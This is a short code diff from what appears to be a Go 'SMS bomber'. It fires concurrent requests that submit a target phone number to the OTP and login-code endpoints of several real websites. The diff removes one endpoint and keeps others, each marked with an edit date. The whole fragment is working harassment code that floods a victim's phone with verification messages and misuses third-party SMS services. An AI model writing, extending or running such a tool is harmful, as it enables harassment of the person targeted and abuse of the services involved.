@@ -363,9 +363,6 @@ func main() {
 		go sms("https://core.pishkhan24.ayantech.ir/webservices/core.svc/v1/LoginByOTP", map[string]interface{}{
 			"null, Username": phone,
 		}, ch)  // edit :4/22/2025
-		go sms("https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
-			"mobile": phone,
-		}, ch)  // edit :4/22/2025
 		go sms("https://dicardo.com/sendotp", map[string]interface{}{
 			"phone": phone,
 		}, ch)  // edit :4/22/2025
